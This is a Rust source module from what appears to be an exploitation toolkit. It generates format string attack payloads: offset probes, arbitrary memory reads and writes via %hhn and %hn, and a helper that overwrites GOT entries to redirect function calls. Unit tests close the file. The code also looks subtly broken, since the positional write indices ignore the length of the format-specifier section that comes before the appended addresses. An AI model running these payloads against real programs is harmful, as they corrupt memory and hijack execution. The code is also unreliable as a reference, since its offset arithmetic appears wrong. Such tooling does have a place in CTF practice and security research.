//! Format String Exploitation Module
//!
//! Provides tools for exploiting format string vulnerabilities.
//! Supports offset detection, arbitrary read/write, and payload generation.

use super::packing::{p32, p64};
use super::Architecture;

/// Format string exploit context
#[derive(Debug, Clone)]
pub struct FmtStr {
    /// Offset on stack where input appears
    offset: usize,
    /// Target architecture
    arch: Architecture,
    /// Padding to align addresses
    padding: usize,
    /// Written byte count so far
    written: usize,
    /// Use hhn (byte) or hn (short) writes
    use_bytes: bool,
}

impl FmtStr {
    /// Create new format string context
    pub fn new(offset: usize, arch: Architecture) -> Self {
        Self {
            offset,
            arch,
            padding: 0,
            written: 0,
            use_bytes: true, // Default to byte-by-byte writes (%hhn)
        }
    }

    /// Create for 32-bit architecture
    pub fn new_32(offset: usize) -> Self {
        Self::new(offset, Architecture::X86)
    }

    /// Create for 64-bit architecture
    pub fn new_64(offset: usize) -> Self {
        Self::new(offset, Architecture::X86_64)
    }

    /// Set padding before addresses
    pub fn with_padding(mut self, padding: usize) -> Self {
        self.padding = padding;
        self
    }

    /// Use short writes (%hn) instead of byte writes (%hhn)
    pub fn use_short_writes(mut self) -> Self {
        self.use_bytes = false;
        self
    }

    /// Get pointer size in bytes
    fn ptr_size(&self) -> usize {
        match self.arch {
            Architecture::X86 => 4,
            Architecture::X86_64 => 8,
            _ => 8,
        }
    }

    /// Generate payload to write a single byte at an address
    pub fn write_byte(&self, addr: u64, value: u8) -> Vec<u8> {
        let mut payload = Vec::new();

        // Pad to alignment
        payload.extend(std::iter::repeat(b'A').take(self.padding));

        // Calculate how many bytes to write
        let current_written = self.padding;
        let target = (value as usize).wrapping_sub(current_written) % 256;

        // Format specifier to write value bytes, then %n
        if target > 0 {
            payload.extend(format!("%{}c", target).as_bytes());
        }

        // The write specifier
        let ptr_offset = self.offset + (self.padding / self.ptr_size());
        payload.extend(format!("%{}$hhn", ptr_offset).as_bytes());

        // Pad to pointer alignment
        while payload.len() % self.ptr_size() != 0 {
            payload.push(b'.');
        }

        // Append address
        match self.arch {
            Architecture::X86 => payload.extend(p32(addr as u32)),
            Architecture::X86_64 => payload.extend(p64(addr)),
            _ => payload.extend(p64(addr)),
        }

        payload
    }

    /// Generate payload to write arbitrary data to an address
    /// Uses %hhn for byte-by-byte writes
    pub fn write(&self, addr: u64, data: &[u8]) -> Vec<u8> {
        if self.use_bytes {
            self.write_bytes_payload(addr, data)
        } else {
            self.write_shorts_payload(addr, data)
        }
    }

    /// Write using %hhn (byte writes)
    fn write_bytes_payload(&self, addr: u64, data: &[u8]) -> Vec<u8> {
        // Strategy: Write each byte individually
        // Layout: [format_specifiers][padding][addresses]
        let ptr_size = self.ptr_size();
        let num_writes = data.len();

        // Calculate address section size
        let addr_section_size = num_writes * ptr_size;

        // Build format specifier section
        let mut fmt_section = Vec::new();

        // Add initial padding
        for _ in 0..self.padding {
            fmt_section.push(b'A');
        }

        // Calculate base offset (after format specifiers + addresses)
        let mut written = self.padding as u32;

        // For each byte, generate %Nc%M$hhn
        for (i, &byte) in data.iter().enumerate() {
            let target = byte as u32;
            let diff = (target.wrapping_sub(written)) % 256;

            if diff > 0 {
                let spec = format!("%{}c", diff);
                fmt_section.extend(spec.as_bytes());
                written = written.wrapping_add(diff);
            }

            // Write using positional parameter
            let pos = self.offset + i;
            let spec = format!("%{}$hhn", pos);
            fmt_section.extend(spec.as_bytes());
        }

        // Align format section to pointer boundary
        while fmt_section.len() % ptr_size != 0 {
            fmt_section.push(b'.');
        }

        // Build address section
        let mut addr_section = Vec::new();
        for i in 0..num_writes {
            let write_addr = addr + i as u64;
            match self.arch {
                Architecture::X86 => addr_section.extend(p32(write_addr as u32)),
                Architecture::X86_64 => addr_section.extend(p64(write_addr)),
                _ => addr_section.extend(p64(write_addr)),
            }
        }

        // Combine sections
        let mut payload = fmt_section;
        payload.extend(addr_section);
        payload
    }

    /// Write using %hn (2-byte writes)
    fn write_shorts_payload(&self, addr: u64, data: &[u8]) -> Vec<u8> {
        let ptr_size = self.ptr_size();

        // Pad data to even length
        let mut padded_data = data.to_vec();
        if padded_data.len() % 2 != 0 {
            padded_data.push(0);
        }

        let num_writes = padded_data.len() / 2;

        // Build writes sorted by value to minimize padding
        let mut writes: Vec<(u16, u64)> = Vec::new();
        for i in 0..num_writes {
            let value = u16::from_le_bytes([padded_data[i * 2], padded_data[i * 2 + 1]]);
            let write_addr = addr + (i * 2) as u64;
            writes.push((value, write_addr));
        }

        // Sort by value ascending
        writes.sort_by_key(|w| w.0);

        // Build format section
        let mut fmt_section = Vec::new();
        for _ in 0..self.padding {
            fmt_section.push(b'A');
        }

        let mut written = self.padding as u32;

        for (i, (value, _addr)) in writes.iter().enumerate() {
            let target = *value as u32;
            let diff = (target.wrapping_sub(written)) % 65536;

            if diff > 0 {
                let spec = format!("%{}c", diff);
                fmt_section.extend(spec.as_bytes());
                written = written.wrapping_add(diff);
            }

            let pos = self.offset + i;
            let spec = format!("%{}$hn", pos);
            fmt_section.extend(spec.as_bytes());
        }

        // Align
        while fmt_section.len() % ptr_size != 0 {
            fmt_section.push(b'.');
        }

        // Build address section (in sorted order)
        let mut addr_section = Vec::new();
        for (_, write_addr) in writes {
            match self.arch {
                Architecture::X86 => addr_section.extend(p32(write_addr as u32)),
                Architecture::X86_64 => addr_section.extend(p64(write_addr)),
                _ => addr_section.extend(p64(write_addr)),
            }
        }

        let mut payload = fmt_section;
        payload.extend(addr_section);
        payload
    }

    /// Generate payload to write a 32-bit value
    pub fn write32(&self, addr: u64, value: u32) -> Vec<u8> {
        let bytes = value.to_le_bytes();
        self.write(addr, &bytes)
    }

    /// Generate payload to write a 64-bit value
    pub fn write64(&self, addr: u64, value: u64) -> Vec<u8> {
        let bytes = value.to_le_bytes();
        self.write(addr, &bytes)
    }

    /// Generate payload to leak a value from an address
    pub fn read(&self, addr: u64) -> Vec<u8> {
        let mut payload = Vec::new();
        let ptr_size = self.ptr_size();

        // Pad to alignment
        for _ in 0..self.padding {
            payload.push(b'A');
        }

        // Read specifier
        let pos = self.offset + (self.padding / ptr_size);
        payload.extend(format!("%{}$s", pos).as_bytes());

        // Align
        while payload.len() % ptr_size != 0 {
            payload.push(b'.');
        }

        // Address to read from
        match self.arch {
            Architecture::X86 => payload.extend(p32(addr as u32)),
            Architecture::X86_64 => payload.extend(p64(addr)),
            _ => payload.extend(p64(addr)),
        }

        payload
    }

    /// Generate probe payload to detect format string offset
    pub fn probe_payload(marker: &str, max_offset: usize) -> String {
        let mut payload = String::from(marker);
        for i in 1..=max_offset {
            payload.push_str(&format!(".%{}$p", i));
        }
        payload
    }

    /// Parse probe output to find the offset where marker appears
    pub fn find_offset(marker: &str, output: &str) -> Option<usize> {
        // Convert marker to hex representation
        let marker_hex: String = marker.bytes().map(|b| format!("{:02x}", b)).collect();

        // Look for marker in each position
        for (i, part) in output.split('.').enumerate() {
            if i == 0 {
                continue;
            } // Skip initial marker

            // Handle 0x prefix
            let hex = part.trim_start_matches("0x");

            // Check if this position contains our marker
            if hex.contains(&marker_hex)
                || marker.bytes().all(|b| {
                    let s = format!("{:02x}", b);
                    hex.contains(&s)
                })
            {
                return Some(i);
            }
        }
        None
    }
}

/// GOT overwrite helper
pub struct GotOverwrite {
    fmtstr: FmtStr,
}

impl GotOverwrite {
    pub fn new(offset: usize, arch: Architecture) -> Self {
        Self {
            fmtstr: FmtStr::new(offset, arch),
        }
    }

    /// Overwrite GOT entry to redirect function call
    pub fn overwrite(&self, got_addr: u64, new_addr: u64) -> Vec<u8> {
        match self.fmtstr.arch {
            Architecture::X86 => self.fmtstr.write32(got_addr, new_addr as u32),
            Architecture::X86_64 => self.fmtstr.write64(got_addr, new_addr),
            _ => self.fmtstr.write64(got_addr, new_addr),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fmtstr_creation() {
        let fs = FmtStr::new_64(6);
        assert_eq!(fs.offset, 6);
        assert_eq!(fs.ptr_size(), 8);
    }

    #[test]
    fn test_fmtstr_32bit() {
        let fs = FmtStr::new_32(7);
        assert_eq!(fs.ptr_size(), 4);
    }

    #[test]
    fn test_probe_payload() {
        let probe = FmtStr::probe_payload("AAAA", 10);
        assert!(probe.starts_with("AAAA"));
        assert!(probe.contains("%1$p"));
        assert!(probe.contains("%10$p"));
    }

    #[test]
    fn test_write_byte() {
        let fs = FmtStr::new_64(6);
        let payload = fs.write_byte(0x401000, 0x41);
        // Should contain format specifier and address
        assert!(!payload.is_empty());
    }

    #[test]
    fn test_read_payload() {
        let fs = FmtStr::new_64(6);
        let payload = fs.read(0x401000);
        // Should contain %s specifier and address
        let payload_str = String::from_utf8_lossy(&payload);
        assert!(payload_str.contains("$s"));
    }

    #[test]
    fn test_find_offset() {
        // Simulated output where AAAA appears at offset 6
        let output = "AAAA.0x1.0x2.0x3.0x4.0x5.0x41414141.0x7";
        let offset = FmtStr::find_offset("AAAA", output);
        assert_eq!(offset, Some(6));
    }
}
